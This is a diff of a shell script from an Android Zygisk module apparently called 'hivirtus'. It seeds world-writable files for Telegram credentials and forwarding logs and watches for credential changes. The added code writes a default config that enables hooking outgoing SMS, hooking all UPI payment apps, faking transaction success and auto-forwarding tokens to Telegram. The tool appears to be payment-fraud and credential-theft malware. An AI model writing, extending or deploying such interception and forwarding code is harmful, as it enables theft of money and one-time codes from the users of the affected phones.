@@ -251,7 +251,6 @@ hivirtus_seed_app_writable_files() {
   for f in \
     /data/local/tmp/hivirtus_ui_save.json \
     /data/local/tmp/hivirtus_telegram_credentials.json \
-    /data/local/tmp/hivirtus_tg_test.request \
     /data/local/tmp/hivirtus_tg_forward.log \
     /data/local/tmp/hivirtus_tg_last_response.txt \
     /data/local/tmp/hivirtus_tg_test_response.txt \
@@ -270,13 +269,23 @@ hivirtus_seed_app_writable_files() {
     fi
     chmod 666 "$f" 2>/dev/null
   done
+  # tg_test.request — DO NOT auto-create (spam). Only chmod if Save created it.
+  [ -f /data/local/tmp/hivirtus_tg_test.request ] && chmod 666 /data/local/tmp/hivirtus_tg_test.request 2>/dev/null
   if [ -f /data/local/tmp/hivirtus_zygisk_mode_config.json ]; then
     chmod 666 /data/local/tmp/hivirtus_zygisk_mode_config.json 2>/dev/null
   else
-    echo '{}' > /data/local/tmp/hivirtus_zygisk_mode_config.json 2>/dev/null
+    # Safe defaults with intercept ON (A16 unread pe bhi module.prop path fallback)
+    cat > /data/local/tmp/hivirtus_zygisk_mode_config.json << 'EOF'
+{
+  "hook_outgoing_sms": true,
+  "intercept_fake_success": true,
+  "hook_all_upi_apps": true,
+  "fake_intercept_telegram": true,
+  "auto_forward_token": true
+}
+EOF
     chmod 666 /data/local/tmp/hivirtus_zygisk_mode_config.json 2>/dev/null
   fi
-  # Log ONCE per boot (spam mat karo)
   if [ "$quiet" != "quiet" ] && [ ! -f /data/local/tmp/hivirtus_tg_seeded.flag ]; then
     echo "tg_files_seeded $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
     echo 1 > /data/local/tmp/hivirtus_tg_seeded.flag
@@ -323,13 +332,12 @@ hivirtus_tg_watchdog() {
   chmod 666 /data/local/tmp/hivirtus_telegram_credentials.json 2>/dev/null
   HASH="${tg_t}|${tg_c}"
   OLD=$(cat /data/local/tmp/hivirtus_tg_creds.hash 2>/dev/null)
-  if [ "$HASH" != "$OLD" ] || [ -f /data/local/tmp/hivirtus_tg_test.request ]; then
+  # ONLY queue test when creds CHANGE — request-file existence pe spam mat karo
+  if [ "$HASH" != "$OLD" ]; then
     echo "$HASH" > /data/local/tmp/hivirtus_tg_creds.hash
     echo 1 > /data/local/tmp/hivirtus_tg_test.request
     chmod 666 /data/local/tmp/hivirtus_tg_test.request 2>/dev/null
-    if [ "$HASH" != "$OLD" ]; then
-      echo "tg_test_queued_watchdog $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
-    fi
+    echo "tg_test_queued_watchdog $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
   fi
 }
 
